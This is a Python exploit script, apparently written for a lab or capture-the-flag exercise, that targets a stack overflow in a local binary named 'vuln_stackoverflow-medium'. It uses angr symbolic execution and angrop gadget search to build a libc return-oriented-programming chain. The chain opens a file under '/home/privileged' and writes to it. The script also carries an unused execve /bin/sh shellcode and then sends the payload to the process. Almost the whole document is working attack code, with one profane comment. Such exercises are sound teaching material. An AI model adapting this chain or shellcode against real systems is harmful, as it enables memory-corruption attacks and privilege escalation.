import angr, argparse, IPython, angrop
import claripy
from pwn import *
import pickle
from os import path
def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True
def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''

    # get all the symbolic bytes from stdin
    stdin = state.posix.stdin

    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('argv1'):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr
shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
exe = context.binary = ELF('vuln_stackoverflow-medium')
libc = exe.libc
base_libc = exe.maps[libc.path]
print("libc address: ",hex(base_libc))
def main():
    elf_binary ="vuln_stackoverflow-medium"
    p = angr.Project(elf_binary, load_options={'auto_load_libs': False})

    exploited = p.loader.main_object.get_symbol(
        'svcunix_create_vuln')

    goal = p.loader.main_object.get_symbol(
        'goal')

    argv1 = claripy.BVS("argv1",8*500)
    #state = p.factory.full_init_state(args=[elf_binary,argv])
    #state = p.factory.entry_state(args=[elf_binary,argv1])

    state = p.factory.entry_state(args=[elf_binary],stdin=argv1)
    #state = p.factory.call_state(exploited.rebased_addr,argv1)#addr=exploited.rebased_addr
    state.libc.buf_symbolic_bytes = 0x200
    state.libc.max_variable_size = 0x200
    state.libc.max_str_len = 205# fuck that shit, our string can be bigger than the default of 128, only at around 140bytes will the bof trigger
    #for i in range(0,200):
    #    state.add_constraints(argv1.get_byte(i) != 0)

    
    simgr = p.factory.simulation_manager(state, save_unconstrained=True)
    simgr.stashes['mem_corrupt']  = []
    
    
    def check_mem_corruption(simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"ABCD"]):
                    path.add_constraints(path.regs.pc == b"ABCD")
                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')
        return simgr
    """
    simgr.explore(step_func=check_mem_corruption)

    IPython.embed()

    ep = simgr.mem_corrupt[0]

    input = ep.solver.eval(argv1,cast_to=bytes)

    pointer_offset = input.find(b"ABCD"[::-1])

    print("offset",pointer_offset)
    """
    pointer_offset = 128 #temp


    libc_off = base_libc#0xf7c00000
    str1 = b"//home/privileged/stackoverflow-medium"

    p = angr.Project("/lib/i386-linux-gnu/libc.so.6",main_opts={'base_addr': libc_off})

    rop = p.analyses.ROP()

    rop.set_badbytes([0x00,0x0A,0x09,0x0c,0xd,0x20])
    

    if path.exists("gadgets_cache"):
        rop.load_gadgets("gadgets_cache")
    else:
        rop.find_gadgets()
        rop.save_gadgets("gadgets_cache")
    
    
    print([str1[i:min(i+4,len(str1))][::-1].hex() for i in range(0, len(str1), 4)])

    code_base = libc_off
    chain = b""

    #######rop write string to mem##########
    temp_code = rop.write_to_mem(0x804c055, b"////home/privileged/stackoverflow-medium").payload_code()
    print(temp_code)
    mod_locals = locals()
    exec("\n".join(temp_code.split("\n")[1:]),globals(),mod_locals)
    chain+=mod_locals["chain"]
    #######rop write string to mem##########
    
    
    #######custom rop to set 0 byte of string##########
    pop_eax = 0x00028177
    pop_ecx_eax = 0x001066d0
    xor_eax_eax = 0x000336af
    mov_ecx_eax = 0x000b3730 # has side effects, 0x000b4558 : mov ecx, eax ; mov eax, ecx ; ret
                    
    chain += p32(code_base + xor_eax_eax)      # xor eax, eax; ret 
    chain += p32(code_base + mov_ecx_eax)      # mov ecx, eax; ret
    chain += p32(code_base + pop_eax)
    chain += p32(0x804c05d)
    chain += p32(code_base + 0x6ece4)       # mov dword ptr [eax], ecx; ret 
    #######custom rop to set 0 byte of string##########
     
    
    #######write args to stack##########
    temp_code = rop.func_call("open", [0x804c055,0x01020241]).payload_code()
    print(temp_code)
    mod_locals = locals()
    exec("\n".join(temp_code.split("\n")[1:]),globals(),mod_locals)
    chain+=mod_locals["chain"]
    #######write args to stack##########

    #######custom rop call open##########
    chain+=p32(code_base +  0x000edaf0)
    #######custom rop call open##########
    
    #######reset angrop##########
    p = angr.Project("/lib/i386-linux-gnu/libc.so.6",main_opts={'base_addr': libc_off})
    rop = p.analyses.ROP()
    rop.set_badbytes([0x00,0x0A,0x09,0x0c,0xd,0x20])
    if path.exists("gadgets_cache"):
        rop.load_gadgets("gadgets_cache")
    else:
        rop.find_gadgets()
        rop.save_gadgets("gadgets_cache")
    #######reset angrop##########

    #######write success string to memory##########
    temp_code = rop.write_to_mem(0x804c055, b"successa").payload_code()
    print(temp_code)
    mod_locals = locals()
    exec("\n".join(temp_code.split("\n")[1:]),globals(),mod_locals)
    chain+=mod_locals["chain"]
    #######write success string to memory##########
    
    #######custom rop to set 0 byte of string##########
    chain += p32(code_base + xor_eax_eax)      # xor eax, eax; ret 
    chain += p32(code_base + mov_ecx_eax)      # mov ecx, eax; ret
    chain += p32(code_base + pop_eax)
    chain += p32(0x804c05c)
    chain += p32(code_base + 0x6ece4)       # mov dword ptr [eax], ecx; ret 
    #######custom rop to set 0 byte of string##########
    

    #######custom rop call write##########
    pop_ecx_eax = 0x00103bf0
    add_eax_3 = 0x000b3660
    mov_edx_eax = 0x0012778d
    mov_esi_edx = 0x0009eb2f
    pop_edx = 0x00131b57
    add_eax_7 = 0x0016188f
    push_and_call_args = 0x00076ab0


    chain += p32(code_base + pop_ecx_eax)
    chain += p32(code_base + 0x000ee010)
    chain += p32(0xffffffff)
    chain += p32(code_base + xor_eax_eax)
    chain += p32(code_base + add_eax_3)
    chain += p32(code_base + mov_edx_eax)
    chain += p32(code_base + mov_esi_edx)
    chain += p32(code_base + pop_edx)
    chain += p32(0x804c055)
    chain += p32(code_base + xor_eax_eax)
    chain += p32(code_base + add_eax_7)
    chain += p32(code_base + push_and_call_args)
    #######custom rop call write##########


    with open("payload","wb") as f:
        f.write(pointer_offset*b"a"+chain)
    
    #send exploit
    chan = process(elf_binary)
    chan.sendline(pointer_offset*b"a"+chain)
    
if __name__ == "__main__":
    main()
